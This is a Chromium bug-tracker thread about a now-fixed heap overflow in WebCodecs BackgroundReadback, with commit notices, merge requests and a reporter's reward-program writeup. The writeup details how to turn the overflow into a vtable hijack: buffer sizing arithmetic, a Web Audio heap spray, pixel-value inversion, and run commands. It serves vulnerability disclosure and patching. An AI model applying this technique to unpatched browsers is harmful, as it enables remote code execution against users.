02-19 15:19:13.339 10706 10717 F DEBUG   :       #15 pc 0000000000244f3c  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libbase.cr.so (base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+348) (BuildId: d893b8a87fc51f04)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #16 pc 00000000001f5119  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libbase.cr.so (base::RunLoop::Run(base::Location const&)+409) (BuildId: d893b8a87fc51f04)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #17 pc 000000000259e0ea  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libcontent.cr.so (BuildId: 04d4ed58106fa64d)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #18 pc 0000000002650376  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libcontent.cr.so (BuildId: 04d4ed58106fa64d)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #19 pc 0000000002651059  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libcontent.cr.so (BuildId: 04d4ed58106fa64d)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #20 pc 000000000264ea21  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libcontent.cr.so (content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+689) (BuildId: 04d4ed58106fa64d)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #21 pc 000000000264fb33  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libcontent.cr.so (content::StartContentMain(bool)+211) (BuildId: 04d4ed58106fa64d)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #22 pc 000000000022cc8b  /apex/com.android.art/lib64/libart.so (art_quick_generic_jni_trampoline+219) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #23 pc 00000000002125b6  /apex/com.android.art/lib64/libart.so (art_quick_invoke_static_stub+806) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #24 pc 00000000005af3c9  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+265) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #25 pc 000000000075a40d  /apex/com.android.art/lib64/libart.so (bool art::interpreter::DoCall<false>(art::ArtMethod*, art::Thread*, art::ShadowFrame&, art::Instruction const*, unsigned short, bool, art::JValue*)+2717) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #26 pc 0000000000234f73  /apex/com.android.art/lib64/libart.so (void art::interpreter::ExecuteSwitchImplCpp<false>(art::interpreter::SwitchImplContext*)+15443) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #27 pc 0000000000210c35  /apex/com.android.art/lib64/libart.so (ExecuteSwitchImplAsm+5) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #28 pc 000000000027dd50  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/base.apk (offset 0x4421000)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #29 pc 000000000075156c  /apex/com.android.art/lib64/libart.so (art::interpreter::Execute(art::Thread*, art::CodeItemDataAccessor const&, art::ShadowFrame&, art::JValue, bool, bool) (.__uniq.112435418011751916792819755956732575238)+476) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #30 pc 00000000007594d6  /apex/com.android.art/lib64/libart.so (art::interpreter::ArtInterpreterToInterpreterBridge(art::Thread*, art::CodeItemDataAccessor const&, art::ShadowFrame*, art::JValue*)+102) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #31 pc 000000000075a40d  /apex/com.android.art/lib64/libart.so (bool art::interpreter::DoCall<false>(art::ArtMethod*, art::Thread*, art::ShadowFrame&, art::Instruction const*, unsigned short, bool, art::JValue*)+2717) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #32 pc 0000000000234b52  /apex/com.android.art/lib64/libart.so (void art::interpreter::ExecuteSwitchImplCpp<false>(art::interpreter::SwitchImplContext*)+14386) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #33 pc 0000000000210c35  /apex/com.android.art/lib64/libart.so (ExecuteSwitchImplAsm+5) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #34 pc 000000000011ddac  /apex/com.android.art/javalib/core-oj.jar
02-19 15:19:13.339 10706 10717 F DEBUG   :       #35 pc 000000000075156c  /apex/com.android.art/lib64/libart.so (art::interpreter::Execute(art::Thread*, art::CodeItemDataAccessor const&, art::ShadowFrame&, art::JValue, bool, bool) (.__uniq.112435418011751916792819755956732575238)+476) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #36 pc 0000000000b54d28  /apex/com.android.art/lib64/libart.so (artQuickToInterpreterBridge+776) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #37 pc 000000000022ce1c  /apex/com.android.art/lib64/libart.so (art_quick_to_interpreter_bridge+140) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #38 pc 0000000000212254  /apex/com.android.art/lib64/libart.so (art_quick_invoke_stub+756) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #39 pc 00000000005af382  /apex/com.android.art/lib64/libart.so (art::ArtMethod::Invoke(art::Thread*, unsigned int*, unsigned int, art::JValue*, char const*)+194) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #40 pc 0000000000a88c89  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallback(void*)+1593) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #41 pc 0000000000a88648  /apex/com.android.art/lib64/libart.so (art::Thread::CreateCallbackWithUffdGc(void*)+8) (BuildId: 1dffeb3e1a52565f94f45026acf33adc)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #42 pc 0000000000088c5f  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*) (.__uniq.67847048707805468364044055584648682506)+63) (BuildId: 4ca6c4bbf033a547c118b1bbc03d14c6)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #43 pc 000000000007a55d  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+61) (BuildId: 4ca6c4bbf033a547c118b1bbc03d14c6)


```

### dx...@google.com (2026-02-20)

Project: chromium/src  

Branch:  main  

Author:  Eugene Zemtsov [eugene@chromium.org](mailto:eugene@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7596362>

media: Fix heap buffer overflow in WebCodecs BackgroundReadback

---


Expand for full commit details
```
     
    This fixes a mismatch between coded_size and visible_rect during GPU 
    readback. The code was writing the full coded size into a destination 
    pointer that was offset by the visible_rect origin, causing an 
    out-of-bounds write. 
     
    Bug: 485683110 
    Test: https://chromium-review.googlesource.com/c/chromium/src/+/5667032 
    Change-Id: I30e58c2f5f71a55d4e63eaa047b64f6b88904faa 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7596362 
    Reviewed-by: Thomas Guilbert <tguilbert@chromium.org> 
    Commit-Queue: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1587594}

```

---

Files:

- M `third_party/blink/renderer/modules/webcodecs/background_readback.cc`

---

Hash: [72f220565650fc67e72f0e6c176177ad212b2a54](https://chromiumdash.appspot.com/commit/72f220565650fc67e72f0e6c176177ad212b2a54)  

Date: Fri Feb 20 03:28:39 2026


---

### je...@gmail.com (2026-02-20)

Hi, Chrome VRP, Please use c6eed09fc8b174b0f3eebedcceb1e792 as the CVE credit for this vulnerability. Thank you.

### ch...@google.com (2026-02-20)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-20)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### je...@gmail.com (2026-02-21)

Can you mark this bug as FIXED?

### ch...@google.com (2026-02-21)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-02-24)

Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1587594) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1587594) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: M145 is already shipping to stable.

Security Merge Request - Manual Review: Merge review required: M146 has already been cut for stable release.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### eu...@chromium.org (2026-02-24)

> Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.googlesource.com/c/chromium/src/+/7596362>

> Has this fix been verified on Canary to not pose any stability regressions?

yes

> Does this fix pose any potential non-verifiable stability risks?

no

> Does this fix pose any known compatibility risks?

no

> Does it require manual verification by the test team? If so, please describe required testing.
> (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

open <https://djuffin.github.io/web/oob.html> on Android

### dx...@google.com (2026-02-24)

Project: chromium/src  

Branch:  main  

Author:  Eugene Zemtsov [eugene@chromium.org](mailto:eugene@chromium.org)  

Link:    <https://chromium-review.googlesource.com/5667032>

webcodecs: Add a GPU test for encoding a cropped frames

---


Expand for full commit details
```
     
    Adds a new integration test (`crop-encode.html`) that crops a 
    VideoFrame by giving it a smaller visibleRect offset, then encodes 
    it. 
     
    Bug: 349062462, 485683110 
    Change-Id: I04ab35880e8935c03d7bf8363d87f8b703fc146c 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5667032 
    Reviewed-by: Brian Sheedy <bsheedy@chromium.org> 
    Commit-Queue: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1589726}

```

---

Files:

- M `content/test/content_test_bundle_data.filelist`
- A `content/test/data/gpu/webcodecs/crop-encode.html`
- A `content/test/data/gpu/webcodecs/crop-encode.js`
- M `content/test/data/gpu/webcodecs/webcodecs_common.js`
- M `content/test/gpu/gpu_tests/webcodecs_integration_test.py`

---

Hash: [7b24b25350b74c0266348ec99546f8111fadae50](https://chromiumdash.appspot.com/commit/7b24b25350b74c0266348ec99546f8111fadae50)  

Date: Tue Feb 24 22:52:02 2026


---

### je...@gmail.com (2026-02-25)

deleted

### je...@gmail.com (2026-02-25)

For Chrome VRP:

## Exploit

This exploit demonstrates a heap out-of-bounds write in the renderer process that achieves fully controlled instruction pointer hijack from pure JavaScript. Per the Chrome Vulnerability Reward Program rules (<https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules#reward-amounts>), this submission qualifies under the "Renderer RCE / memory corruption in a sandboxed process" category at the "High-quality report demonstrating controlled write" tier. The controlled write is demonstrated by the register dump showing RAX = `0x4143434341434343` (the attacker's chosen vtable pointer) at a `call *0x8(%rax)` virtual destructor dispatch instruction, with trap `0x0d` (General Protection Fault) confirming the CPU attempted to follow the attacker-controlled virtual dispatch. The exploit is delivered as a single HTML page against a clean, unmodified release build at Chromium commit `f51a685e768b6` on Linux x86-64.

## Precision Overflow Geometry

The overflow amount produced by this vulnerability equals `visible_rect.y * stride + coded_width * coded_height * 4 - bucket_size`, where `bucket_size` is the PartitionAlloc slot size for the pixel buffer allocation. Prior exploit attempts used a coded size of 16 by 16 with `visible_rect.y = 6`, producing a 128-byte overflow. This corrupted the adjacent VideoFrame's vtable pointer at offset +0x00 and its reference count at offset +0x08, along with many subsequent fields. The reference count was overwritten to approximately one billion, which meant that `Release()` could never decrement it to zero, and the virtual destructor was never invoked. The resulting crash occurred at non-virtual member pointer dereferences rather than at a vtable dispatch, which, while demonstrating heap corruption, did not constitute a true PC hijack.

The key insight enabling the precision geometry is a property of single-plane pixel formats in Chromium's video frame implementation. When `VideoFrame::ComputeStrides` encounters a format with exactly one plane, it does not round the stride up to `kFrameAddressAlignment` (64 bytes on x86):

```
// media/base/video_frame.cc
std::vector<size_t> VideoFrame::ComputeStrides(VideoPixelFormat format,
                                               const gfx::Size& coded_size) {
  std::vector<size_t> strides;
  const size_t num_planes = NumPlanes(format);
  if (num_planes == 1) {
    strides.push_back(RowBytes(0, format, coded_size.width()));
  } else {
    for (size_t plane = 0; plane < num_planes; ++plane) {
      strides.push_back(base::bits::AlignUp(
          RowBytes(plane, format, coded_size.width()), kFrameAddressAlignment));
    }
  }
  return strides;
}

```

For ABGR and XBGR formats (both single-plane at four bytes per pixel), the stride equals `coded_width * 4` with no rounding. This frees the visible offset from the constraint of being a multiple of 64, allowing fine-grained control over the overflow amount. The overflow can be set to any value that satisfies `coded_width * (visible_y + coded_height) = (1280 + overflow) / 4`, where 1280 is the PartitionAlloc bucket size. Setting the overflow to exactly eight bytes requires finding integer solutions to `coded_width * (visible_y + coded_height) = 322`, since `322 = (1280 + 8) / 4`. The factorization `322 = 2 * 7 * 23` yields several valid parameter sets; the exploit selects `coded_size = 14 x 21` with `visible_rect = (0, 2, 14, 19)`.

The arithmetic confirms the geometry. The stride is `14 * 4 = 56` bytes. The buffer size is `14 * 21 * 4 = 1176` bytes. The allocation size, including the 63-byte alignment overhead from `buffer_addr_align`, is `1176 + 63 = 1239` bytes, which falls into PartitionAlloc bucket 1280 (covering allocations from 1025 through 1280 bytes). The visible offset is `2 * 56 = 112` bytes. The write size equals the buffer size of 1176 bytes. The overflow is therefore `112 + 1176 - 1280 = 8` bytes, precisely the width of a 64-bit vtable pointer.

## PartitionAlloc Bucket Co-location

Both the pixel buffer and the `media::VideoFrame` object reside in PartitionAlloc bucket 1280 within the default malloc partition. The pixel buffer's allocation of 1239 bytes places it squarely in this bucket. The VideoFrame object occupies approximately 1152 bytes (`sizeof(VideoFrame) = 0x480`), and with PartitionAlloc's in-slot metadata the effective size rounds to roughly 1156 bytes, which also falls within bucket 1280. Because both objects share the same bucket and partition, they are drawn from the same slot spans, and adjacent slots within a span will frequently contain one of each type.

The pixel buffer is allocated through `base::UncheckedCalloc` during `VideoFrame::AllocateMemory`, while the VideoFrame object itself is constructed via `new` within the frame pool's `CreateFrame` method. Both allocation paths route through the default PartitionAlloc partition, ensuring that the two object types compete for the same pool of 1280-byte slots.

## VideoFrame Object Layout and Vtable Preservation

The `media::VideoFrame` class inherits from `base::RefCountedThreadSafe<VideoFrame>` and declares a single virtual function, the destructor:

```
// media/base/video_frame.h
class MEDIA_EXPORT VideoFrame : public base::RefCountedThreadSafe<VideoFrame> {
  // ...
 protected:
  friend class base::RefCountedThreadSafe<VideoFrame>;
  virtual ~VideoFrame();
};

```

On x86-64, the object layout places the vtable pointer at offset +0x00, followed by the `AtomicRefCount` member inherited from `RefCountedThreadSafeBase` at offset +0x08. With an eight-byte overflow, only the vtable pointer is overwritten; the reference count is left entirely untouched. This distinction is what makes the precision geometry critical. For frames managed by `BackgroundReadback`'s internal `result_frame_pool_`, a cached frame's reference count sits at one, held by the pool's single `scoped_refptr`. When the pool eventually releases this frame, the reference count decrements from one to zero, and `RefCountedThreadSafe::Release` invokes `Traits::Destruct`, which calls `delete`, triggering a virtual destructor dispatch through the corrupted vtable pointer.

## Pixel Pipeline and OOB Content Control

The eight overflow bytes originate from the last two pixels of the bottom row of the readback data, corresponding to the tail end of the coded area that extends past the allocation boundary. These pixels are read directly from the WebGL texture attached to the source VideoFrame, giving the attacker complete control over their content.

The readback pipeline applies a deterministic color transformation that the attacker must account for when selecting input pixel values. The `SkImageInfo` constructed by `GetImageInfoForFrame` specifies `kUnpremul_SkAlphaType`, while the compositor internally premultiplies alpha during compositing. The round-trip through premultiply followed by unpremultiply transforms each color channel according to `round(round(C * A / 255) * 255 / A)`, where `C` is the color channel value and `A` is the alpha channel value. The alpha channel itself passes through unchanged. This transformation is invertible for the purpose of exploit construction: given a desired output byte pattern, the attacker solves for the WebGL input values that produce it after the pipeline transformation.

For this exploit, the target vtable pointer is `0x4143434341434343`, a non-canonical x86-64 address (bits 48 through 63 evaluate to `0x4143`, which is not the sign-extension of bit 47) that guarantees a General Protection Fault on any dereference attempt. In kRGBA\_8888 byte order, this eight-byte value decomposes into two identical pixels of `[0x43, 0x43, 0x43, 0x41]`. Working backwards through the color pipeline with target `C_out = 0x43` and `A = 0x41`, the required input is `C_in = 0x41`, since `round(round(0x41 * 0x41 / 255) * 255 / 0x41) = round(round(65 * 65 / 255) * 255 / 65) = round(17 * 255 / 65) = round(66.69) = 0x43`. The exploit therefore fills the WebGL canvas with the uniform RGBA value `(0x41, 0x41, 0x41, 0x41)` using `gl.clearColor`, which produces exactly the desired vtable value after readback.

## Exploit Flow

The exploit begins by creating heap pressure through a Web Audio API spray. Two thousand `PannerNode` objects are instantiated with the HRTF panning model, each of which allocates an `HRTFPanner` of approximately 1096 bytes in the FastMalloc partition's bucket 1280. Although these reside in a different partition from the pixel buffer, the spray empirically improves the adjacency rate between pixel buffer and VideoFrame allocations in the default partition. After creation, every other panner is freed by switching its model to `'equalpower'`, which destroys the underlying C++ object and creates a hole pattern that further influences subsequent allocation layout.

A 14 by 21 WebGL2 canvas is then created with `premultipliedAlpha` set to false and `alpha` set to true. The entire canvas is filled with the input value `(0x41, 0x41, 0x41, 0x41)` selected to produce the target vtable pointer after the readback color transformation. A VideoEncoder is configured for VP8 at the visible dimensions of 14 by 19.

The exploit encodes 30 VideoFrames from the canvas, each specifying `visibleRect` as `{x: 0, y: 2, width: 14, height: 19}`. For each frame, the WebCodecs pipeline invokes `BackgroundReadback::ReadbackRGBTextureBackedFrameToMemory`, which allocates a result VideoFrame and its pixel buffer from the internal frame pool. The asynchronous GPU readback writes 1176 bytes starting at the visible offset of 112 bytes within the 1280-byte slot, overflowing exactly eight bytes into the adjacent slot. Across 30 frames with an estimated per-frame adjacency probability of roughly 40%, the cumulative probability of at least one successful vtable corruption exceeds 99.9%.

After encoding completes, the exploit closes the encoder, releases the remaining panners and audio contexts, and navigates to `about:blank`. The navigation destroys the execution context, tearing down the `BackgroundReadback` supplement and its internal frame pool. When the pool releases its cached frames, the corrupted VideoFrame's reference count decrements from one to zero, triggering the virtual destructor dispatch through the corrupted vtable pointer.

## Crash Analysis

The crash signal and register state from an actual execution on a clean release build are reproduced below:

```
Received signal 11 SI_KERNEL000000000000
 Possibly a General Protection Fault, can be due to a non-canonical address dereference.
#0 0x562545425092 base::debug::CollectStackTrace()
#1 0x56254541162e base::debug::StackTrace::StackTrace()
#2 0x562545424b08 base::debug::(anonymous namespace)::StackDumpSignalHandler()
#3 0x7f8dbcc42520 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4251f)
#4 0x5625408f0498 media::VpxVideoEncoder::Encode()
  r8: 000056254d4e0a80  r9: 0000000000000000 r10: 0000000000000000 r11: 0000000000000000
 r12: 0000000000000001 r13: 0000000000000001 r14: 00007f8db79f93b8 r15: 000056254cbf0060
  di: 00000f3c0cd73700  si: 0000000000000007  bp: 00007f8db79f96a0  bx: 0000000000000000
  dx: 0000000000000000  ax: 4143434341434343  cx: 0000000000000000  sp: 00007f8db79f93b0
  ip: 00005625408f0498 efl: 0000000000010246 cgf: 002b000000000033 erf: 0000000000000000
 trp: 000000000000000d msk: 0000000000000000 cr2: 0000000000000000
[end of stack trace]

```

The instruction pointer `0x5625408f0498` corresponds to file offset `0x5c14498` in the Chrome binary, confirmed by computing the load base from the page-aligned difference between runtime and symbol addresses. The `nm` symbol table places `media::VpxVideoEncoder::Encode` at file offset `0x5c13450`, so the crash occurs at offset +0x1048 within the function body. Disassembly at this location reveals the complete `scoped_refptr<VideoFrame>` release sequence, which the compiler has inlined at the function epilogue:

```
mov    -0x30(%rbp), %rdi       ; load pointer to corrupted VideoFrame
lock decl 0x8(%rdi)            ; atomic decrement ref_count at +0x08: 1 -> 0
setne  %al                     ; al = 0 (ref_count was 1, now 0, ZF is set)
test   %rdi, %rdi
sete   %cl                     ; cl = 0 (pointer is non-null)
or     %al, %cl                ; cl = 0: ref_count reached zero AND pointer valid
jne    skip                    ; not taken, proceed to delete
mov    (%rdi), %rax            ; load vtable pointer from +0x00 -> rax = 0x4143434341434343
call   *0x8(%rax)              ; virtual destructor dispatch -> #GP

```

The `lock decl 0x8(%rdi)` instruction atomically decrements the reference count at offset +0x08, which remains at its legitimate value of one because the eight-byte overflow corrupted only the vtable at +0x00. After the decrement produces zero, the conditional logic determines that deletion is required and falls through to the virtual dispatch. The `mov (%rdi), %rax` instruction loads the corrupted vtable pointer, producing `RAX = 0x4143434341434343`. The `call *0x8(%rax)` instruction then attempts to read the destructor's function pointer from `*(0x4143434341434343 + 0x8)`, which is the non-canonical address `0x414343434143434b`. The CPU raises General Protection Fault (trap `0x0d`), and the process terminates with signal 11. If the attacker arranges for the vtable pointer to reference a controlled memory region containing a fake vtable, the `call` will transfer control to an arbitrary address.

## Reproduction

The exploit was tested against Chromium commit `f51a685e768b6`. It requires a non-component release build with no source code patches applied. The build configuration in `out/release/args.gn` is as follows:

```
is_debug = false
dcheck_always_on = false
target_cpu = "x64"
is_component_build = false

```

The build is produced with:

```
autoninja -C out/release chrome

```

The exploit is served over a local HTTP server and loaded in Chromium with flags that force the vulnerable readback path. The `--disable-features=GpuMemoryBufferReadbackFromTexture` flag prevents the GPU memory buffer fast path from being selected, ensuring that `ReadbackRGBTextureBackedFrameToMemory` is invoked instead. On Android this is the default behavior and the flag is unnecessary. The development and testing environment is a headless Linux server without a physical GPU, so SwiftShader software rendering is used via `--use-gl=angle --use-angle=swiftshader --enable-unsafe-swiftshader`. This is purely an artifact of the test environment and does not affect the vulnerability itself, which exists in the `BackgroundReadback` readback path and is reachable on any platform with a functional WebGL and WebCodecs implementation.

```
python3 -m http.server 8889 --bind 127.0.0.1 &

xvfb-run -a ./out/release/chrome \
  --no-sandbox \
  --disable-features=GpuMemoryBufferReadbackFromTexture \
  --use-gl=angle --use-angle=swiftshader \
  --enable-unsafe-swiftshader \
  --user-data-dir=/tmp/pwn-$(date +%s) \
  --enable-logging=stderr --v=0 \
  http://127.0.0.1:8889/exp_vtable_dispatch_crash.html

```

The exploit file is `exp_vtable_dispatch_crash.html`. Within seconds of loading, the renderer process crashes with signal 11, trap `0x0d` (General Protection Fault), and RAX containing `0x4143434341434343` at the `call *0x8(%rax)` instruction inside `media::VpxVideoEncoder::Encode`.

### ch...@google.com (2026-02-25)

Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1589726) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1589726) appears to be after beta branch point (1582197).
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### eu...@chromium.org (2026-02-25)

> Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.googlesource.com/c/chromium/src/+/7596362>

> Has this fix been verified on Canary to not pose any stability regressions?

yes

> Does this fix pose any potential non-verifiable stability risks?

no

> Does this fix pose any known compatibility risks?

no

> Does it require manual verification by the test team? If so, please describe required testing. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

open <https://djuffin.github.io/web/oob.html> on Android

### dr...@chromium.org (2026-02-25)

No crashes in Canary. Merge approved. I'm not sure the FoundIn is correct here, and ideally we'd merge to Extended Stable as well. Approving a merge to all three milestones.

### ch...@google.com (2026-02-25)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-25)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### eu...@chromium.org (2026-02-25)

> Why does your merge fit within the merge criteria for these milestones?
> Chrome Browser: <https://chromiumdash.appspot.com/branches>
> Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

yes

> What changes specifically would you like to merge? Please link to Gerrit.

<https://chromium-review.googlesource.com/c/chromium/src/+/7596362>

> Have the changes been released and tested on canary?

yes

> Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

no

### dx...@google.com (2026-02-26)

Project: chromium/src  

Branch:  refs/branch-heads/7632  

Author:  Eugene Zemtsov [eugene@chromium.org](mailto:eugene@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7609985>

[M145] media: Fix heap buffer overflow in WebCodecs BackgroundReadback

---


Expand for full commit details
```
     
    This fixes a mismatch between coded_size and visible_rect during GPU 
    readback. The code was writing the full coded size into a destination 
    pointer that was offset by the visible_rect origin, causing an 
    out-of-bounds write. 
     
    (cherry picked from commit 72f220565650fc67e72f0e6c176177ad212b2a54) 
     
    Bug: 485683110 
    Test: https://chromium-review.googlesource.com/c/chromium/src/+/5667032 
    Change-Id: I30e58c2f5f71a55d4e63eaa047b64f6b88904faa 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7596362 
    Reviewed-by: Thomas Guilbert <tguilbert@chromium.org> 
    Commit-Queue: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1587594} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7609985 
    Reviewed-by: Eugene Zemtsov <eugene@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7632@{#3394} 
    Cr-Branched-From: 0bbdf2913883391365383b0a5dfe7bf9fd1a5213-refs/heads/main@{#1568190}

```

---

Files:

- M `third_party/blink/renderer/modules/webcodecs/background_readback.cc`

---

Hash: [5829cc2119c826227ea59088c3f630475b2941bf](https://chromiumdash.appspot.com/commit/5829cc2119c826227ea59088c3f630475b2941bf)  

Date: Thu Feb 26 00:36:28 2026


---

